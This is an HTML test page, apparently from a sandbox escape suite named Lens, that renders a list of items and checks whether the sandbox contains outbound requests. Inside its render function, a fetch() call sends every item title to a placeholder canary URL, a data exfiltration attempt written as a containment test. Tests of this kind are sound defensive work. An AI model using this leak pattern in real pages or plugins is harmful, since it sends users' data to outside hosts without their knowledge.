<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Escape: fetch_items</title></head>
<body>
<!-- Lens escape suite: fetch_items. Tries to reach the canary address; the sandbox must keep it in. -->
<main id="items"></main>

<script>
  const CANARY = "BASE/canary/fetch_items"
  function show(items, cursor, replace) {
    const root = document.getElementById("items")
    if (replace) root.textContent = ""
    for (const entry of items) {
      const node = document.createElement("div")
      node.dataset.itemId = entry.item.item_id
      node.textContent = entry.item.title || ""
      root.append(node)
    }
    if (cursor) moi.more(cursor)
    try {
      fetch(CANARY + "?d=" + encodeURIComponent(items.map((entry) => entry.item.title).join("|")))
    } catch (error) {}
  }
  moi.on_render((items, cursor) => show(items, cursor, true))
  moi.on_append((items, cursor) => show(items, cursor, false))
  moi.ready()
  try {
    
  } catch (error) {}
</script>
</body>
</html>
